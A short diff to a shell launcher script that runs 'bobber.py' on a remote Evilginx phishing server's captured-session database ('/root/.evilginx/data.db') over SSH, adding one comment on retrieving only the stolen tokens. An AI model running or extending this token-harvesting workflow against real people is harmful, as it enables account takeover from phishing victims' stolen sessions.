@@ -91,6 +91,8 @@ if [[ "${Remote,,}" == "true" ]]; then
 
         # If the --password argument is provided, it will use password-based authentication.
         # If the --key argument is provided and password is not specified, it will fall back to key-based authentication using the specified private key.
+
+        #remove $TFflags $AZflags $OPSflag if you want only the tokens.
         python bobber.py "/root/.evilginx/data.db" --host $Host_IP --username $SSH_User --password $SSH_Pwd $Gexflags $TFflags $AZflags $OPSflag
     else
         python bobber.py "/root/.evilginx/data.db" --host $Host_IP --username $SSH_User --password $SSH_Pwd $Gexflags $TFflags $AZflags
